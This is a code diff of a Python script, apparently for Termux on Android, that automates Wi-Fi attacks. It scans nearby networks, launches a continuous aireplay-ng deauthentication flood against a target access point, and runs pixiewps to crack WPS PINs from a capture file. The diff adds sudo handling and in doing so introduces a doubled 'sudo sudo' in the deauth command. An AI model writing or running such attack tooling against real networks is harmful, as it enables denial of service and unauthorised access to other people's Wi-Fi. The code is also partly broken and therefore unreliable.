@@ -1,8 +1,10 @@
 import subprocess
 import time
 
-def run_command(command):
+def run_command(command, use_sudo=False):
     """Ejecuta un comando de shell y muestra la salida"""
+    if use_sudo:
+        command = f"sudo {command}"
     print(f"Ejecutando comando: {command}")
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     stdout, stderr = process.communicate()
@@ -15,18 +17,18 @@ def run_command(command):
 def turn_off_wifi():
     """Apagar el Wi-Fi usando Termux"""
     print("Apagando el Wi-Fi...\n")
-    run_command("termux-wifi-enable false")
+    run_command("termux-wifi-enable false", use_sudo=False)
 
 def turn_on_hotspot():
     """Activar el Hotspot Wi-Fi"""
     print("Activando el Hotspot Wi-Fi...\n")
-    run_command("tsu settings put global tether_dun_required 0")
-    run_command("tsu settings put global tether_enable 1")
+    run_command("settings put global tether_dun_required 0", use_sudo=True)
+    run_command("settings put global tether_enable 1", use_sudo=True)
 
 def scan_wifi():
     """Escanear redes Wi-Fi cercanas"""
     print("Escaneando redes Wi-Fi...\n")
-    result = run_command("iw dev wlan0 scan | grep SSID | awk -F ':' '{print $2}'")
+    result = run_command("iw dev wlan0 scan | grep SSID | awk -F ':' '{print $2}'", use_sudo=True)
     
     if not result:
         print("No se encontraron redes Wi-Fi.\n")
@@ -64,21 +66,18 @@ def select_network(networks):
 def deauth_attack(target_mac):
     """Realizar un ataque de desautenticación"""
     print(f"Realizando ataque de desautenticación contra {target_mac}...\n")
-    result = run_command(f"sudo aireplay-ng --deauth 0 -a {target_mac} wlan0")
+    result = run_command(f"sudo aireplay-ng --deauth 0 -a {target_mac} wlan0", use_sudo=True)
     print(result)
     print("Ataque de desautenticación finalizado.\n")
 
 def pixiewps_attack(target_pcap):
     """Realizar un ataque Pixiewps sobre un archivo pcap"""
     print(f"Realizando ataque Pixiewps sobre {target_pcap}...\n")
-    result = run_command(f"pixiewps -r {target_pcap} -o cracked.txt")
+    result = run_command(f"pixiewps -r {target_pcap} -o cracked.txt", use_sudo=True)
     print(result)
     print("Ataque Pixiewps finalizado.\n")
 
 def main():
-    # Asegurarse de tener permisos de superusuario
-    run_command("tsu")
-    
     # Apagar el Wi-Fi y activar el Hotspot
     turn_off_wifi()
     time.sleep(2)  # Esperar a que el Wi-Fi se apague completamente
@@ -107,6 +106,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
 
